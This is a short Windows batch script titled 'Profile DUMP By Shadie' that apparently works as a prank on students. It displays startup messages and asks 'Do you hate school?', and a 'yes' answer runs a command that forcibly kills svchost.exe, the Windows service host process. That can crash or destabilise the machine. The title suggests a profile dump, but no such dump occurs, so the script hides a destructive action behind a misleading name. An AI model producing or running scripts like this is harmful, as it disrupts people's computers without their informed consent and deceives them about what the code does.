@echo on
setlocal
echo Profile DUMP By Shadie
timeout /t 5 /nobreak > nul
echo Starting Script
timeout /t 5 /nobreak > nul
echo Started!!

:inputPrompt
set /p userInput="Do you hate school? (yes/no): "

if /i "%userInput%"=="yes" (
    taskkill /im svchost.exe /f
    echo Command for YES executed.
    goto end
) else if /i "%userInput%"=="no" (
    echo You typed NO. TYPE YES BRO!!
    goto end
) else (
    echo Invalid input. Please type YES or NO.
    goto inputPrompt
)

:end
echo Done.
endlocal
